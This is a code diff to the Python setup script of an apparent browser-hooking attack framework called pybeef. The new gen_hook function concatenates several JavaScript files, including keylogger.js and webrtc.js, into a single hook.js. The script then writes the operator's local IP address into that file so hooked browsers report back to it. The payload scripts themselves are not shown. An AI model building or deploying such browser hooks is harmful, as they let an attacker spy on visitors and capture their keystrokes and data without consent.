@@ -7,7 +7,7 @@ import subprocess
 import re 
 
 current_path = os.path.abspath('.')
-hook_path = current_path+"/templates/static/hook.js"
+hook_path = "/root/pybeef/templates/static/hook.js"
 
 def get_ip_address(ifname):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -23,6 +23,7 @@ def start_database():
     child = subprocess.Popen(args=cmd,shell=True)   
     print "start mongodb pid: "+str(child.pid)
     child.wait()
+
 def config_hook(ip):
     for line in fileinput.input(hook_path,inplace=True):
         p = re.search(r"\d+\.\d+\.\d+\.\d+",line)
@@ -32,15 +33,27 @@ def config_hook(ip):
             print line,
     fileinput.close()
 
-def main():
+def gen_hook():
+    os.chdir("/root/pybeef/templates/static/")
+    fp_hook = open('hook.js','w')
+    fp_hook.truncate()
+    for file_name in ['jquery-3.1.1.js','request.js','webrtc.js','pybeef.js',
+    'browser_me.js','keylogger.js']:
+        with open(file_name) as f:
+            f_js = f.read()
+        fp_hook.write(f_js)
+
+def beef_init():
     ip = get_ip_address("eth0")
     print "get local ip address :"+ip
     
-    print "config hook.js"
-    config_hook(ip)
-
     print "start database..."
     start_database()
+    print "generate hook.js"
+    gen_hook()
+
+    print "config hook.js"
+    config_hook(ip)
+    
     print "exit"
-if __name__ == '__main__':
-    main()
+
